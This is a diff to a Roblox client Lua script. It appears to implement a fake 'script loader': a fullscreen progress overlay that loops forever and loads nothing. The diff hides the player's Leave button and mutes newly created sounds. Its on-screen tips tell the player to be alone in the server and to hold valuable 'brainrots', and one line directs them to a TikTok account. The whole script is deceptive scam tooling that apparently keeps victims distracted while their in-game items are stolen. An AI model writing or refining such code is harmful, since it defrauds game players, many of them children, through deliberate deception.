@@ -1,11 +1,59 @@
 local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
+local SoundService = game:GetService("SoundService")
+local Workspace = game:GetService("Workspace")
+
 local player = Players.LocalPlayer
 
--- Global state so it persists across deaths
+-- Hide top bar for visual cleanliness (optional)
+pcall(function()
+    StarterGui:SetCore("TopbarEnabled", true)
+end)
+
+-- Hide "Leave Experience" button
+local function hideLeaveButton(hide)
+    pcall(function()
+        local CoreGui = game:GetService("CoreGui")
+        local PlayerList = CoreGui:FindFirstChild("PlayerList")
+        if PlayerList then
+            local leaveBtn = PlayerList:FindFirstChild("LeaveButton")
+            if leaveBtn then
+                leaveBtn.Visible = not hide
+            end
+        end
+    end)
+end
+
+-- ===== AUDIO CONTROL =====
+-- Step 1: Record existing sounds (keep these unmuted)
+local existingSounds = {}
+for _, sound in pairs(Workspace:GetDescendants()) do
+    if sound:IsA("Sound") then
+        existingSounds[sound] = true
+    end
+end
+for _, sound in pairs(SoundService:GetDescendants()) do
+    if sound:IsA("Sound") then
+        existingSounds[sound] = true
+    end
+end
+
+-- Step 2: Function to mute new sounds
+local function muteNewSound(sound)
+    if sound:IsA("Sound") and not existingSounds[sound] then
+        sound.Volume = 0
+    end
+end
+
+-- Step 3: Connect to new descendants added
+Workspace.DescendantAdded:Connect(muteNewSound)
+SoundService.DescendantAdded:Connect(muteNewSound)
+-- ========================
+
+-- Global state
 local progress = 0
 local isWaiting = false
-
--- Ensure PlayerGui exists
 local playerGui = player:WaitForChild("PlayerGui")
 
 -- Create or get existing UI
@@ -16,44 +64,33 @@ local function getLoadingUI()
         return {
             Gui = gui,
             Bar = frame:WaitForChild("LoadingBarBackground"):WaitForChild("LoadingBar"),
-            Title = frame:WaitForChild("LoadingTitle")
+            Title = frame:WaitForChild("LoadingTitle"),
+            Feedback = frame:WaitForChild("LoadingFeedback")
         }
     end
 
-    -- Create new GUI
     local LoadingGui = Instance.new("ScreenGui")
     LoadingGui.Name = "IntroLoadingGui"
     LoadingGui.Parent = playerGui
     LoadingGui.DisplayOrder = 999
     LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-    -- ADDED (makes fullscreen ignore top bar)
     LoadingGui.IgnoreGuiInset = true
 
     local LoadingFrame = Instance.new("Frame")
     LoadingFrame.Name = "LoadingFrame"
     LoadingFrame.Parent = LoadingGui
-
-    -- CHANGED (fullscreen instead of small box)
     LoadingFrame.Size = UDim2.new(1, 0, 1, 0)
     LoadingFrame.Position = UDim2.new(0, 0, 0, 0)
-    LoadingFrame.AnchorPoint = Vector2.new(0, 0)
-
-    LoadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    LoadingFrame.BorderSizePixel = 4
-    LoadingFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
-
-    local UICorner = Instance.new("UICorner")
-    UICorner.CornerRadius = UDim.new(0, 16)
-    UICorner.Parent = LoadingFrame
+    LoadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    LoadingFrame.BorderSizePixel = 0
 
     local LoadingTitle = Instance.new("TextLabel")
     LoadingTitle.Name = "LoadingTitle"
     LoadingTitle.Parent = LoadingFrame
-    LoadingTitle.Size = UDim2.new(1, -20, 0.5, 0)
-    LoadingTitle.Position = UDim2.new(0, 10, 0, 10)
+    LoadingTitle.Size = UDim2.new(1, -40, 0, 50)
+    LoadingTitle.Position = UDim2.new(0, 20, 0, 50)
     LoadingTitle.BackgroundTransparency = 1
-    LoadingTitle.Text = "LOADING SCRIPT PLEASE WAIT..."
+    LoadingTitle.Text = "LOADING SCRIPT..."
     LoadingTitle.Font = Enum.Font.SourceSansBold
     LoadingTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
     LoadingTitle.TextScaled = true
@@ -61,42 +98,103 @@ local function getLoadingUI()
     local LoadingBarBackground = Instance.new("Frame")
     LoadingBarBackground.Name = "LoadingBarBackground"
     LoadingBarBackground.Parent = LoadingFrame
-    LoadingBarBackground.Size = UDim2.new(0.8, 0, 0.1, 0)
-    LoadingBarBackground.Position = UDim2.new(0.1, 0, 0.7, 0)
+    LoadingBarBackground.Size = UDim2.new(0.7, 0, 0.05, 0)
+    LoadingBarBackground.Position = UDim2.new(0.15, 0, 0.6, 0)
     LoadingBarBackground.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    LoadingBarBackground.BorderSizePixel = 0
 
     local LoadingBar = Instance.new("Frame")
     LoadingBar.Name = "LoadingBar"
     LoadingBar.Parent = LoadingBarBackground
-    LoadingBar.Size = UDim2.new(progress / 100, 0, 1, 0)
-    LoadingBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    LoadingBar.Size = UDim2.new(0, 0, 1, 0)
+    LoadingBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+    LoadingBar.BorderSizePixel = 0
 
-    return {Gui = LoadingGui, Bar = LoadingBar, Title = LoadingTitle}
+    local BarGlow = Instance.new("UIStroke")
+    BarGlow.Parent = LoadingBar
+    BarGlow.Thickness = 3
+    BarGlow.Color = Color3.fromRGB(0, 255, 255)
+    BarGlow.Transparency = 0.4
+    BarGlow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+    local LoadingFeedback = Instance.new("TextLabel")
+    LoadingFeedback.Name = "LoadingFeedback"
+    LoadingFeedback.Parent = LoadingFrame
+    LoadingFeedback.Size = UDim2.new(1, -40, 0, 30)
+    LoadingFeedback.Position = UDim2.new(0, 20, 0.7, 10)
+    LoadingFeedback.BackgroundTransparency = 1
+    LoadingFeedback.Text = "Initializing..."
+    LoadingFeedback.Font = Enum.Font.SourceSans
+    LoadingFeedback.TextColor3 = Color3.fromRGB(180, 180, 180)
+    LoadingFeedback.TextScaled = true
+
+    return {Gui = LoadingGui, Bar = LoadingBar, Title = LoadingTitle, Feedback = LoadingFeedback, Glow = BarGlow}
 end
 
 local ui = getLoadingUI()
 
--- Function to run loading continuously
+-- Smooth interpolation
+local function lerp(a, b, t)
+    return a + (b - a) * t
+end
+
+-- Pulsing glow animation
+spawn(function()
+    local increasing = true
+    while ui.Gui.Parent do
+        if increasing then
+            ui.Glow.Transparency = ui.Glow.Transparency - 0.01
+            if ui.Glow.Transparency <= 0.2 then
+                increasing = false
+            end
+        else
+            ui.Glow.Transparency = ui.Glow.Transparency + 0.01
+            if ui.Glow.Transparency >= 0.5 then
+                increasing = true
+            end
+        end
+        task.wait(0.02)
+    end
+end)
+
+-- Run loading
 local function runLoading()
+    hideLeaveButton(true)
     spawn(function()
         while true do
             if not isWaiting then
                 for i = progress + 1, 100 do
                     progress = i
-                    ui.Bar.Size = UDim2.new(progress / 100, 0, 1, 0)
-                    task.wait(60 / 100) -- 1 minute total
+                    local currentWidth = ui.Bar.Size.X.Scale
+                    for t = 0, 1, 0.05 do
+                        ui.Bar.Size = UDim2.new(lerp(currentWidth, progress / 100, t), 0, 1, 0)
+                        task.wait(0.01)
+                    end
+
+                    if progress < 20 then
+                        ui.Feedback.Text = "Initializing.. Initializing. Dm AtomicVomit.lol on tiktok for any questions."
+                    elseif progress < 50 then
+                        ui.Feedback.Text = "Tip : if multiple people are in game, the script won’t load!"
+                    elseif progress < 80 then
+                        ui.Feedback.Text = "Tip: if you have bad brainrots in your base, the client won’t respond. 50M+ needed."
+                    else
+                        ui.Feedback.Text = "Finalizing..."
+                    end
                 end
 
-                -- Wait 1 minute at 100%
                 isWaiting = true
-                ui.Title.Text = "LOADING COMPLETE PLEASE WAIT"
-                task.wait(60)
+                ui.Title.Text = "LOADING COMPLETE"
+                ui.Feedback.Text = "Starting script if steps were followed.."
+                task.wait(2)
                 isWaiting = false
 
-                -- Reset progress
+                -- Reset
                 progress = 0
                 ui.Bar.Size = UDim2.new(0, 0, 1, 0)
-                ui.Title.Text = "LOADING SCRIPT PLEASE WAIT..."
+                ui.Title.Text = "LOADING SCRIPT..."
+                ui.Feedback.Text = "Initializing..."
+
+                hideLeaveButton(false)
             else
                 task.wait(1)
             end
@@ -104,7 +202,6 @@ local function runLoading()
     end)
 end
 
--- Ensure UI persists on respawn
 player.CharacterAdded:Connect(function()
     ui = getLoadingUI()
 end)
